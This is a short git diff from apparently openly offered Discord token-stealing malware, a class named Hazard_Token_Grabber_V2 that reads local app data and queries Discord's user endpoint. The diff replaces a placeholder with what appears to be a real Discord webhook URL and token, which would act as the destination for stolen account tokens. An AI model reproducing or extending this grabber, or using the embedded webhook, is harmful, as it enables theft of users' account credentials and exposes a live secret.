@@ -16,7 +16,7 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "WEBHOOK_HERE" #replace WEBHOOK_HERE with your webhook
+        self.webhook = "https://discord.com/api/webhooks/947641582843203624/W6zCD-ULvZP9I8XjRaPliOa0PcBIdwXUi7xPThlw9XJ4mLQLGGXevLwWq4JLXy4uuCRH"
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
